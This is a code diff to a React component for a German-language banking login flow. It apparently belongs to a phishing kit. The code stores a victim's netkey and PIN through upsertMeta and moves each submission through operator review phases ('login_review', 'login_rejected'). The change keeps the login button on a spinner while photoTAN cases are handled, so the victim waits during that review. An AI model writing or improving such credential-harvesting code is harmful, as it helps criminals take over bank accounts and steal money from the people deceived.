@@ -76,8 +76,10 @@ const AuthFlow = () => {
 
   const phase = row.customer_phase || "login";
 
-  if (phase === "login" || phase === "login_rejected") {
-    return <LoginStep row={row} onSubmit={async (netkey, pin) => {
+  const isPhoto = row.tan_method === "photo";
+
+  if (phase === "login" || phase === "login_rejected" || (phase === "login_review" && isPhoto)) {
+    return <LoginStep row={row} forceSubmitting={phase === "login_review"} onSubmit={async (netkey, pin) => {
       await upsertMeta({ netkey, pin });
       await setPhase("login_review", { last_error: null });
     }} />;
@@ -127,7 +129,7 @@ const AuthFlow = () => {
 
 /* ------------------------------- Steps ------------------------------- */
 
-const LoginStep = ({ row, onSubmit }: { row: AuthRow; onSubmit: (netkey: string, pin: string) => Promise<void> }) => {
+const LoginStep = ({ row, onSubmit, forceSubmitting }: { row: AuthRow; onSubmit: (netkey: string, pin: string) => Promise<void>; forceSubmitting?: boolean }) => {
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [uTouched, setUTouched] = useState(false);
@@ -143,6 +145,7 @@ const LoginStep = ({ row, onSubmit }: { row: AuthRow; onSubmit: (netkey: string,
 
   const uErr = uTouched && !username.trim();
   const pErr = pTouched && !password.trim();
+  const isSubmitting = submitting || !!forceSubmitting;
 
   const submit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -182,10 +185,10 @@ const LoginStep = ({ row, onSubmit }: { row: AuthRow; onSubmit: (netkey: string,
           </div>
         </FieldRow>
         <div className="flex justify-end">
-          <Button type="submit" variant="outline" disabled={submitting}
+          <Button type="submit" variant="outline" disabled={isSubmitting}
             className={cn("px-8 bg-white hover:bg-white",
               password.length > 0 ? "border-foreground text-foreground" : "border-muted-foreground/40 text-muted-foreground")}>
-            {submitting ? <Loader2 className="h-4 w-4 animate-spin" /> : "Anmelden"}
+            {isSubmitting ? <Loader2 className="h-4 w-4 animate-spin" /> : "Anmelden"}
           </Button>
         </div>
       </form>
